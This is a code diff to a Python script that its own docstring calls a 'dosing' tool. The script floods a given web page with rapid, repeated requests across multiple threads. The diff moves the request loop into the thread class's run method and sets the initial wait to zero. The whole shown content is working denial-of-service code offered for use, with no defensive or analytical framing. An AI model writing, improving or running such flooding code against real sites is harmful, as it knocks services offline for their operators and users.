@@ -5,33 +5,30 @@ import time
 continueDos = True
 thread = []
 numRequests = 0
-waitForDos = 1
+waitForDos = 0
 threadsinited = 0
 threads = 1
 
-def dos(webPage_):
-    global continueDos, numRequests
-    webPage = str(webPage_)
-    while continueDos:
-        '''
-        The dosing happens here. It is done by
-        requesting the sites html code rappidly. The rest
-        of the code is making it faster via mutliple threads
-        and making the software easier to use
-        '''
-        print(webPage)
-        requests.get(webPage)
-        # print("requested:", webPage)
-        numRequests += 1
-        if (continueDos == False):
-            break
 
 class reqThread (threading.Thread):
     def __init__(self, webPage):
         threading.Thread.__init__(self)
         self.webPage = webPage
     def run(self):
-        dos(self.webPage)
+        global continueDos, numRequests
+        while continueDos:
+            '''
+            The dosing happens here. It is done by
+            requesting the sites html code rappidly. The rest
+            of the code is making it faster via mutliple threads
+            and making the software easier to use
+            '''
+            requests.get(self.webPage)
+            print("requested:", self.webPage)
+            numRequests += 1
+            if (continueDos == False):
+                break
+
 
 
 
